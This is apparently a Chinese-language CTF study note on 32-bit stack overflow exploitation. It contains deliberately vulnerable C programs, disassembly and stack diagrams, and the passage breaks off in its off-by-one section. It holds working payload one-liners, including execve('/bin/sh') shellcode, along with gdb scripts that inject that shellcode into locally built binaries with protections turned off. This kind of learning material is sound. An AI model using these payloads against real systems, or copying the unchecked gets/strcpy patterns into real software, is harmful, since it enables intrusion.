---
---

* ## Intro(stack-overflow | Classic Stack Overflow | csof)

    > [?] hello stack-overflow

    ```sh
    vscode ➜ .../c_learning/ctf/stack-overflow/04 (master) $ gcc -v
    Using built-in specs.
    COLLECT_GCC=gcc
    COLLECT_LTO_WRAPPER=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper
    OFFLOAD_TARGET_NAMES=nvptx-none:amdgcn-amdhsa
    OFFLOAD_TARGET_DEFAULT=1
    Target: x86_64-linux-gnu
    Configured with: ../src/configure -v --with-pkgversion='Ubuntu 13.3.0-6ubuntu2~24.04.1' --with-bugurl=file:///usr/share/doc/gcc-13/README.Bugs --enable-languages=c,ada,c++,go,d,fortran,objc,obj-c++,m2 --prefix=/usr --with-gcc-major-version-only --program-suffix=-13 --program-prefix=x86_64-linux-gnu- --enable-shared --enable-linker-build-id --libexecdir=/usr/libexec --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --enable-bootstrap --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-libstdcxx-backtrace --enable-gnu-unique-object --disable-vtable-verify --enable-plugin --enable-default-pie --with-system-zlib --enable-libphobos-checking=release --with-target-system-zlib=auto --enable-objc-gc=auto --enable-multiarch --disable-werror --enable-cet --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-offload-targets=nvptx-none=/build/gcc-13-EldibY/gcc-13-13.3.0/debian/tmp-nvptx/usr,amdgcn-amdhsa=/build/gcc-13-EldibY/gcc-13-13.3.0/debian/tmp-gcn/usr --enable-offload-defaulted --without-cuda-driver --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu --with-build-config=bootstrap-lto-lean --enable-link-serialization=2
    Thread model: posix
    Supported LTO compression algorithms: zlib zstd
    gcc version 13.3.0 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 

    vscode ➜ .../c_learning/ctf/stack-overflow/04 (master) $ dpkg -l | grep gcc-multilib
    ii  gcc-multilib                  4:13.2.0-7ubuntu1                 amd64        GNU C compiler (multilib files)
    ```

    + ### 栈溢出利用原理演示

        主要通过对用户输入不做边界检查，导致覆盖调用函数之后该执行指令的地址。可以构造用户输入以及要写入的地址，达到控制程序的目的。

        `gcc -g -m32 -no-pie -I ./include  -fno-stack-protector src/stack_example.c -o build/stack_example`
        <!-- panels:start -->
        <!-- div:left-panel-50 -->
        ```C
        // https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/
        // 这个程序的主要目的读取一个字符串，并将其输出。我们希望可以控制程序执行 success 函数。

        // 08049176 <success>:
        // 0x14 个a, 4 个 b, 0x76, 0x91, 0x04, 0x08 就可以成功控制程序执行 success 函数。
        //  ✅    echo -ne "$(printf 'a%.0s' {1..20})bbbb\x76\x91\x04\x08" | ./build/stack_example
        //  ✅    echo -ne "aaaaacccccaaaaadddddeeee\x76\x91\x04\x08" | ./build/stack_example
        //  ✅    (gdb) run < <(printf 'a%.0s' {1..20}; printf 'bbbb\x76\x91\x04\x08\n')
        //  ⭕️    (gdb) run < <(python3 -c "import sys; sys.stdout.buffer.write(b'a' * 20 + b'bbbb\x76\x91\x04\x08\n')")  # 需要 python 可执行文件
        //  ❌    (gdb) python gdb.execute("run <<< '" + (b'a' * 20 + b'bbbb\x76\x91\x04\x08').decode('latin-1') + "'")   # 大于 0x7F，Shell 会对其进行任何 UTF-8 转换，导致 \x91 被 Shell 强行转换成了 \xc2\x91（两个字节）

        // 测试不用栈保护的程序是否存在漏洞？  08049186 <success>:
        // b *0x080491c9
        // starti
        // continue
        // i r ebp
        // set {unsigned int}($ebp + 4) = 0x8049186
        // x/x 0xffffcf9c
        // gdb 可用？

        #include <stdio.h>
        #include <string.h>

        void success(void)
        {
            puts("You Hava already controlled it.");
        }

        void vulnerable(void)
        {
            char s[12];

            gets(s);
            puts(s);

            return;
        }

        int main(int argc, char **argv)
        {
            vulnerable();
            //printf("%p\n", &vulnerable);
            return 0;
        }
        ```
        <!-- div:right-panel-50 -->
        ```masm [data-filter:35]

        08049170 <frame_dummy>:
         8049170:       f3 0f 1e fb             endbr32
         8049174:       eb 8a                   jmp    8049100 <register_tm_clones>

         08049176 <success>:
         8049176:       55                      push   %ebp
         8049177:       89 e5                   mov    %esp,%ebp
         8049179:       53                      push   %ebx
         804917a:       83 ec 04                sub    $0x4,%esp
         804917d:       e8 71 00 00 00          call   80491f3 <__x86.get_pc_thunk.ax>
         8049182:       05 72 2e 00 00          add    $0x2e72,%eax
         8049187:       83 ec 0c                sub    $0xc,%esp
         804918a:       8d 90 14 e0 ff ff       lea    -0x1fec(%eax),%edx
         8049190:       52                      push   %edx
         8049191:       89 c3                   mov    %eax,%ebx
         8049193:       e8 b8 fe ff ff          call   8049050 <puts@plt>
         8049198:       83 c4 10                add    $0x10,%esp
         804919b:       90                      nop
         804919c:       8b 5d fc                mov    -0x4(%ebp),%ebx
         804919f:       c9                      leave
         80491a0:       c3                      ret

        080491a1 <vulnerable>:
         80491a1:       55                      push   %ebp
         80491a2:       89 e5                   mov    %esp,%ebp
         80491a4:       53                      push   %ebx
         80491a5:       83 ec 14                sub    $0x14,%esp
         80491a8:       e8 03 ff ff ff          call   80490b0 <__x86.get_pc_thunk.bx>
         80491ad:       81 c3 47 2e 00 00       add    $0x2e47,%ebx
         80491b3:       83 ec 0c                sub    $0xc,%esp
         80491b6:       8d 45 ec                lea    -0x14(%ebp),%eax
         80491b9:       50                      push   %eax
         80491ba:       e8 81 fe ff ff          call   8049040 <gets@plt>
         80491bf:       83 c4 10                add    $0x10,%esp
         80491c2:       83 ec 0c                sub    $0xc,%esp
         80491c5:       8d 45 ec                lea    -0x14(%ebp),%eax
         80491c8:       50                      push   %eax
         80491c9:       e8 82 fe ff ff          call   8049050 <puts@plt>
         80491ce:       83 c4 10                add    $0x10,%esp
         80491d1:       90                      nop
         80491d2:       8b 5d fc                mov    -0x4(%ebp),%ebx
         80491d5:       c9                      leave
         80491d6:       c3                      ret
        ```
        <!-- panels:end -->

        ```sh
        // 刚进入 vulnerable 函数时的初始化状态
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                                       +       +  Addr |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                                               esp
        // push   %ebp
        // mov    %esp,%ebp
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                                       +  ebp  +  Addr |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                                       esp
                                                                                                                       ebp
        // push   %ebx
        // sub    $0x14,%esp
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                               +  ebx  +  ebp  +  Addr |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                       esp                                             ebp

        // call   80490b0 <__x86.get_pc_thunk.bx>
        // add    $0x2e47,%ebx
        // 这两行利用辅助函数 （__x86.get_pc_thunk.bx） 将下一行指令的地址(80491ad) 放入 ebx 中。 
        // +（0x2e47）得到 .got.plt 的基址（0x804bff4）。`echo "ibase=16;obase=10; ${(U):-80491ad} +  ${(U):-2e47}" | bc`
        // gets 和 puts 是标准 C 库（libc）中的函数，在编译时它们的绝对地址是未知的。需要通过 PLT（程序链接表）去 GOT 表中查找这些函数的真实运行时地址。
        // 在 32 位 PIC 模式下，PLT 中的指令默认会直接读取 ebx 寄存器里的地址作为基准，进而跳转到正确的函数

        // sub    $0xc,%esp
        // lea    -0x14(%ebp),%eax
        // push   %eax
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                       +  eax  +                                                               +  ebx  +  ebp  +  Addr |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                       esp                                                                             ebp
                                            ↳-----------------------------------↑ -0x14(%ebp),%eax                      |

        // call   8049040 <gets@plt>
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                       +  eax  +                               + aaaa  + aaaa  + ab\0* +       +  ebx  +  ebp  +  Addr |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                       esp                                                                             ebp

        // 如果构造如下输入，将覆盖执行完当前函数后需要执行的指令地址。
        // echo -ne "$(printf 'a%.0s' {1..20})bbbb\x76\x91\x04\x08"
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                       +  eax  +                               + aaaa  + aaaa  + aaaa  + aaaa  + aaaa  + bbbb  + 76 91 04 08 |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                                               esp
        // 恢复寄存器状态
        //                 mov    -0x4(%ebp),%ebx
        //      leave <==> mov    %ebp, %esp
        //                 pop    %ebp
        //        ret <==> pop    %eip
        ```

        <details><summary>script.gdb</summary>

        ```sh [data-file:script.gdb]
        # stack-protect attack script

        set debuginfod enabled off
        set confirm off
        # set pagination off

        break *0x080491c9

        run < <(printf 'a%.0s' {1..2})

        # 直接修改就好了，不用覆盖
        set {unsigned int}($ebp + 4) = 0x08049176

        continue
        ```
        </details>

    + ### 栈上执行 shellcode

        `gcc -g -m32 -I ./include -no-pie -fno-stack-protector -z execstack  src/stack_shell.c -o build/stack_shell`
        <br>`gdb -x script.gdb build/stack_shell`

        <!-- panels:start -->
        <!-- div:left-panel-50 -->
        ```c
        /*
         * https://github.com/JnuSimba/LinuxSecNotes/blob/master/Linux%20X86%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97/%E7%BB%8F%E5%85%B8%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA.md

             *** stack smashing detected ***: terminated

         * scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
         * echo -ne "$(printf 'a%.0s' {1..28})bbbb\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" | ./build/stack_shell
         * printf '%s\n' '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' | tr -d '\\x' | rasm2 -a x86 -b 32 -d -
         * 
         * b *main+47
         * ecx :    0xffffcf70
                    0xffffcf70
         * run  `printf 'a%.0s' {1..12}; printf '\x70\xcf\xff\xff'; printf 'a%.0s' {1..24}; printf '\x74\xcf\xff\xff'; printf 'argc'; printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'`
         * 
         * 
         * ./build/stack_shell `printf 'a%.0s' {1..12}; printf '\x70\xcf\xff\xff'; printf 'a%.0s' {1..24}; printf '\x74\xcf\xff\xff'; printf 'argc'; printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'`
         * 
         * 
         * 
         * 
         * sudo sysctl -w kernel.randomize_va_space=0|2
         * 
         * 
         * 
         */

        #include <stdio.h>
        #include <string.h>

        int main(int argc, char* argv[]) {
            /* [1] */ char buf[12];
            /* [2] */ strcpy(buf,argv[1]);
            /* [3] */ printf("Input:%s\n",buf);
            return 0;
        }
        ```
        <!-- div:right-panel-50 -->
        ```masm {2-9, 12-15, 22-28,30-34} [data-filter:35]
        08049176 <main>:
         8049176:       8d 4c 24 04             lea    0x4(%esp),%ecx
         804917a:       83 e4 f0                and    $0xfffffff0,%esp
         804917d:       ff 71 fc                push   -0x4(%ecx)
         8049180:       55                      push   %ebp
         8049181:       89 e5                   mov    %esp,%ebp
         8049183:       53                      push   %ebx
         8049184:       51                      push   %ecx
         8049185:       83 ec 10                sub    $0x10,%esp
         8049188:       e8 23 ff ff ff          call   80490b0 <__x86.get_pc_thunk.bx>
         804918d:       81 c3 67 2e 00 00       add    $0x2e67,%ebx
         8049193:       89 c8                   mov    %ecx,%eax
         8049195:       8b 40 04                mov    0x4(%eax),%eax
         8049198:       83 c0 04                add    $0x4,%eax
         804919b:       8b 00                   mov    (%eax),%eax
         804919d:       83 ec 08                sub    $0x8,%esp
         80491a0:       50                      push   %eax
         80491a1:       8d 45 ec                lea    -0x14(%ebp),%eax
         80491a4:       50                      push   %eax
         80491a5:       e8 a6 fe ff ff          call   8049050 <strcpy@plt>
         80491aa:       83 c4 10                add    $0x10,%esp
         80491ad:       83 ec 08                sub    $0x8,%esp
         80491b0:       8d 45 ec                lea    -0x14(%ebp),%eax
         80491b3:       50                      push   %eax
         80491b4:       8d 83 14 e0 ff ff       lea    -0x1fec(%ebx),%eax
         80491ba:       50                      push   %eax
         80491bb:       e8 80 fe ff ff          call   8049040 <printf@plt>
         80491c0:       83 c4 10                add    $0x10,%esp
         80491c3:       b8 00 00 00 00          mov    $0x0,%eax
         80491c8:       8d 65 f8                lea    -0x8(%ebp),%esp
         80491cb:       59                      pop    %ecx
         80491cc:       5b                      pop    %ebx
         80491cd:       5d                      pop    %ebp
         80491ce:       8d 61 fc                lea    -0x4(%ecx),%esp
         80491d1:       c3                      ret
        ```
        <!-- panels:end -->
        
        ```sh 
        // 刚进入 main 函数时的初始化状态
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                                                                               +  Addr + argc  + argv  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                                                                               esp
        // 2-9 行前奏
        // 有时候进入时 $esp = 0xffffcf7c，有时候为 0xffffcf6c，不影响最后一位都是 c， $0xfffffff0 & %esp 都会减少 12 个字节
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                       +  ecx  +  ebx  +  ebp  +  Addr +                       +  Addr + argc  + argv  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                       esp                                             ebp                                             ecx

        // 10-11 行跟原理演示中的一样，获取 .got.plt 的地址，赋值给 ebx 寄存器，为函数调用做准备。

        // 12-15 获取程序 argv[1] 的地址赋值给 eax

        // 16-21 移动栈顶，将 argv[1] 的地址和 buf 的地址 -0x14(%ebp) 当参数压入栈中，然后调用 strcpy。调完后栈顶归位。
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte                         +  &buf + &a[1] +     $0x8      +                               +  ecx  +  ebx  +  ebp  +  Addr +                       +  Addr + argc  + argv  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                       esp                                                                             ebp                                             ecx
                                                                   --> esp

        // 22-28 移动栈顶，将 buf 的地址 和 `Input:%s\n` 的地址当参数压入栈中，然后调用 printf。调完后栈顶归位。
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte                         + &f_s  + &buf  +     $0x8      +                               +  ecx  +  ebx  +  ebp  +  Addr +                       +  Addr + argc  + argv  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                       esp                                                                             ebp                                             ecx
                                                                   --> esp

        // 30-34 恢复函数调用现场，需要注意: <mark class='clever'>esp 指针是根据 ecx 的值来恢复的，所以 ecx 的值不可覆盖的</mark>。
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte                                                                                         +  ecx  +  ebx  +  ebp  +  Addr +                       +  Addr + argc  + argv  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                                                                               esp     ecx
        ```
        <details><summary>script.gdb</summary>

        ```sh [data-file:script.gdb]
        # stack-protect attack script

        set debuginfod enabled off
        set confirm off
        set pagination off

        b *main+4

        run  `printf 'a%.0s' {1..12}; printf '\x00\x00\x00\x00'; printf 'a%.0s' {1..24}; printf '\x00\x00\x00\x00'; printf 'argc'; printf 'b%.0s' {1..25};`

        # 0xffffcf7c
        print/x $esp


        b *main+47
        c
        x/32xw $eax
        echo \n

        set $ecx_flag = $ecx
        set $r_addr = $ecx + 4

        # 找到参数存储的地方，修复占位符 `\x00\x00\x00\x00`，填充 shellcode
        set $fixed_argv = *(*($ecx + 4) + 4)

        set {unsigned int}($fixed_argv + 12) = $ecx
        set {unsigned int}($fixed_argv + 40) = $ecx + 4
        set {char[25]}($fixed_argv + 48) = {0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80}

        x/32xw $fixed_argv

        continue
        ```

        ![](/.images/corner/ctf/stack-overflow/02-stack_shell_01.gif ':size=99%')
        </details>

    + ### 整形溢出

        `gcc -g -m32 -I ./include -no-pie -fno-stack-protector -z execstack  src/vuln.c -o build/vuln`
        <br>`gdb -x script.gdb build/vuln`

        <!-- panels:start -->
        <!-- div:left-panel-50 -->
        ```c
        /*
         * https://sploitfun.wordpress.com/2015/06/23/integer-overflow/
         * 
         * 
         * 
         */

        //vuln.c
        #include <stdio.h>
        #include <string.h>
        #include <stdlib.h>
        void store_passwd_indb(char* passwd) { }
        void validate_uname(char* uname) {}
        void validate_passwd(char* passwd) {
            char passwd_buf[11];
            unsigned char passwd_len = strlen(passwd); /* [1] */ 
            if(passwd_len >= 4 && passwd_len <= 8) { /* [2] */
                printf("Valid Password\n"); /* [3] */ 
                fflush(stdout);
                strcpy(passwd_buf,passwd); /* [4] */
            } else {
                printf("Invalid Password\n"); /* [5] */
                fflush(stdout);
            }
            store_passwd_indb(passwd_buf); /* [6] */
        }
        int main(int argc, char* argv[]) {
            if(argc!=3) {
                printf("Usage Error:   \n");
                fflush(stdout);
                exit(-1);
            }
            validate_uname(argv[1]);
            validate_passwd(argv[2]);
            return 0;
        }
        ```
        <!-- div:right-panel-50 -->

        ```masm {2-5, 8-11, 17-33, 46-50} [data-cc:540px,data-filter:35]
        080491c6 <validate_passwd>:
         80491c6:       55                      push   %ebp
         80491c7:       89 e5                   mov    %esp,%ebp
         80491c9:       53                      push   %ebx
         80491ca:       83 ec 14                sub    $0x14,%esp
         80491cd:       e8 0e ff ff ff          call   80490e0 <__x86.get_pc_thunk.bx>
         80491d2:       81 c3 22 2e 00 00       add    $0x2e22,%ebx
         80491d8:       83 ec 0c                sub    $0xc,%esp
         80491db:       ff 75 08                push   0x8(%ebp)
         80491de:       e8 9d fe ff ff          call   8049080 <strlen@plt>
         80491e3:       83 c4 10                add    $0x10,%esp
         80491e6:       88 45 f7                mov    %al,-0x9(%ebp)
         80491e9:       80 7d f7 03             cmpb   $0x3,-0x9(%ebp)
         80491ed:       76 40                   jbe    804922f <validate_passwd+0x69>
         80491ef:       80 7d f7 08             cmpb   $0x8,-0x9(%ebp)
         80491f3:       77 3a                   ja     804922f <validate_passwd+0x69>
         80491f5:       83 ec 0c                sub    $0xc,%esp
         80491f8:       8d 83 14 e0 ff ff       lea    -0x1fec(%ebx),%eax
         80491fe:       50                      push   %eax
         80491ff:       e8 5c fe ff ff          call   8049060 <puts@plt>
         8049204:       83 c4 10                add    $0x10,%esp
         8049207:       8b 83 fc ff ff ff       mov    -0x4(%ebx),%eax
         804920d:       8b 00                   mov    (%eax),%eax
         804920f:       83 ec 0c                sub    $0xc,%esp
         8049212:       50                      push   %eax
         8049213:       e8 28 fe ff ff          call   8049040 <fflush@plt>
         8049218:       83 c4 10                add    $0x10,%esp
         804921b:       83 ec 08                sub    $0x8,%esp
         804921e:       ff 75 08                push   0x8(%ebp)
         8049221:       8d 45 ec                lea    -0x14(%ebp),%eax
         8049224:       50                      push   %eax
         8049225:       e8 26 fe ff ff          call   8049050 <strcpy@plt>
         804922a:       83 c4 10                add    $0x10,%esp
         804922d:       eb 26                   jmp    8049255 <validate_passwd+0x8f>
         804922f:       83 ec 0c                sub    $0xc,%esp
         8049232:       8d 83 23 e0 ff ff       lea    -0x1fdd(%ebx),%eax
         8049238:       50                      push   %eax
         8049239:       e8 22 fe ff ff          call   8049060 <puts@plt>
         804923e:       83 c4 10                add    $0x10,%esp
         8049241:       8b 83 fc ff ff ff       mov    -0x4(%ebx),%eax
         8049247:       8b 00                   mov    (%eax),%eax
         8049249:       83 ec 0c                sub    $0xc,%esp
         804924c:       50                      push   %eax
         804924d:       e8 ee fd ff ff          call   8049040 <fflush@plt>
         8049252:       83 c4 10                add    $0x10,%esp
         8049255:       83 ec 0c                sub    $0xc,%esp
         8049258:       8d 45 ec                lea    -0x14(%ebp),%eax
         804925b:       50                      push   %eax
         804925c:       e8 45 ff ff ff          call   80491a6 <store_passwd_indb>
         8049261:       83 c4 10                add    $0x10,%esp
         8049264:       90                      nop
         8049265:       8b 5d fc                mov    -0x4(%ebp),%ebx
         8049268:       c9                      leave
         8049269:       c3                      ret
        ```
        <!-- panels:end -->
        
        ```sh
        // 刚进入 validate_passwd 函数时的初始化状态
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                                                                                       +  Addr + &pwd  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                                                                                       esp

        // 2-5 进入函数后的前奏
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                                                                       + ebx   +  ebp  +  Addr + &pwd  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                               esp                                             ebp

        // 6-7 行跟原理演示中的一样，获取 .got.plt 的地址，赋值给 ebx 寄存器，为函数调用做准备。

        // 8-11 移动栈顶，将 passwd 的地址 0x8(%ebp) 当参数压入栈中，然后调用 strlen。调完后栈顶归位。
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                               + &pwd  +                                                               + ebx   +  ebp  +  Addr + &pwd  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                               esp                                                                             ebp
                                                                                                           --> esp

        // 上面的结果存在 eax 中，但是因为使用了一个字节的类型去接，汇编代码表示为 ax 的低位 al. 所以下面的代码与这个值进行比较。
        // 如果里面的值 <= 3 跳到 35-45（源代码就是 22-23）。不是的话，继续判断里面的值 > 8 就跳到 35-45（源代码就是 22-23）。否则继续从 17 行执行。
        // 17-21 简单的打印，完事儿后栈顶归位。
        // 22-27 中的 stdout 解释。为什么取值为：-0x4(%ebx)，整个过程中 ebx 表示 .got.plt 的基址，往上四个字节正好对应 .got 中的第二项（0x0804bff0）。通过`readelf -x .got -x .got.plt -W build/vuln` 可以看到。
        //       再结合重定位表`readelf -r build/vuln`，发现这个偏移量（0x0804bff0）正好是符号`stdout@GLIBC_2.0`的。`mov -0x4(%ebx),%eax`，此时 eax 中存放的是一个指针变量的地址，`mov (%eax),%eax` 将里面的指向 stdout 的指针赋值给 eax.

        // 28-33 移动栈顶，将 passwd 的地址 0x8(%ebp) 以及 passwd_buf 的地址 -0x14(%ebp) 当参数压入栈中，然后调用 strcpy。调完后栈顶归位。需要构造的 payload 如下：
        // printf 'a%.0s' {1..24}; printf '\x01\x01\x01\x01'; printf 'b%.0s' {1..25}; printf 'c%.0s' {1..207}; 共计`24 + 4 + 25 + 207 = 260` 使用 char 接收时 = 4，符号判断要求。
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                               + &buf  + &pwd  +                       + ///////////////////////////// + ebx   +  ebp  +  Addr + &pwd  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                               esp                                     eax                                     ebp
                                                                                                           --> esp
        ```
        <details><summary>script.gdb</summary>

        ```sh [data-file:script.gdb]
        # stack-protect attack script

        set debuginfod enabled off
        set confirm off
        set pagination off

        b *validate_passwd+95

        run  `printf 'admin'` `printf 'a%.0s' {1..24}; printf '\x01\x01\x01\x01'; printf 'b%.0s' {1..25}; printf 'c%.0s' {1..207};`

        print/x $esp
        echo \n
        x/32xw $esp

        # 找到参数存储的地方，修复占位符 `\x01\x01\x01\x01`，填充 shellcode
        set $fixed_argv = *(int*)($esp + 4)

        set {unsigned int}($fixed_argv + 24) = $eax + 28
        set {char[25]}($fixed_argv + 28) = {0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80}

        x/32xw $fixed_argv

        continue
        ```

        ![](/.images/corner/ctf/stack-overflow/03-integer-overflow_01.gif ':size=99%')
        </details>

    + ### 单字节溢出漏洞（off-by-one）

        `gcc -g -m32 -I ./include -no-pie -fno-stack-protector -z execstack  src/vuln.c -o build/vuln`
        <br>`gdb -x script.gdb build/vuln`

        > [!WARNING|style:flat] 单字节溢出漏洞演示中，由于环境的不一致，比较难复现文章中的效果，不过知道大概原理后，也可以模拟出来。
        <br>所以下面的代码溢出的也就不止一个字节了。

        <!-- panels:start -->
        <!-- div:left-panel-50 -->
        ```c
        /*
         * https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/
         * 
         * 
         * 
         */

        //vuln.c
        #include <stdio.h>
        #include <string.h>

        void foo(char* arg);
        void bar(char* arg);

        void foo(char* arg) {
            bar(arg); /* [1] */
        }

        void bar(char* arg) {
            char buf[256];
            strcpy(buf, arg); /* [2] */
        }

        int main(int argc, char *argv[]) {
            if(strlen(argv[1])>512) { /* [3] */
                printf("Attempted Buffer Overflow\n");
                fflush(stdout);
                return -1;
            }
            foo(argv[1]); /* [4] */
            return 0;
        }
        ```
        <!-- div:right-panel-50 -->

        ```masm {22-28} [data-filter:35]
        08049196 <foo>:
         8049196:       55                      push   %ebp
         8049197:       89 e5                   mov    %esp,%ebp
         8049199:       83 ec 08                sub    $0x8,%esp
         804919c:       e8 d3 00 00 00          call   8049274 <__x86.get_pc_thunk.ax>
         80491a1:       05 53 2e 00 00          add    $0x2e53,%eax
         80491a6:       83 ec 0c                sub    $0xc,%esp
         80491a9:       ff 75 08                push   0x8(%ebp)
         80491ac:       e8 06 00 00 00          call   80491b7 <bar>
         80491b1:       83 c4 10                add    $0x10,%esp
         80491b4:       90                      nop
         80491b5:       c9                      leave
         80491b6:       c3                      ret
        
        080491b7 <bar>:
         80491b7:       55                      push   %ebp
         80491b8:       89 e5                   mov    %esp,%ebp
         80491ba:       53                      push   %ebx
         80491bb:       81 ec 04 01 00 00       sub    $0x104,%esp
         80491c1:       e8 ae 00 00 00          call   8049274 <__x86.get_pc_thunk.ax>
         80491c6:       05 2e 2e 00 00          add    $0x2e2e,%eax
         80491cb:       83 ec 08                sub    $0x8,%esp
         80491ce:       ff 75 08                push   0x8(%ebp)
         80491d1:       8d 95 f8 fe ff ff       lea    -0x108(%ebp),%edx
         80491d7:       52                      push   %edx
         80491d8:       89 c3                   mov    %eax,%ebx
         80491da:       e8 71 fe ff ff          call   8049050 <strcpy@plt>
         80491df:       83 c4 10                add    $0x10,%esp
         80491e2:       90                      nop
         80491e3:       8b 5d fc                mov    -0x4(%ebp),%ebx
         80491e6:       c9                      leave
         80491e7:       c3                      ret
        ```
        <!-- panels:end -->

        ```sh
        // 刚进入 foo 函数时的初始化状态
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                                                                                       +  Addr + &a[1] |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                                                                                       esp
        
        // 刚进入 bar 函数时的初始化状态
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                       +80491b1+ &a[1] +                                       +  ebp  +  Addr + &a[1] |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                       esp                                                     ebp       
        
        // 16-21 bar 函数前奏
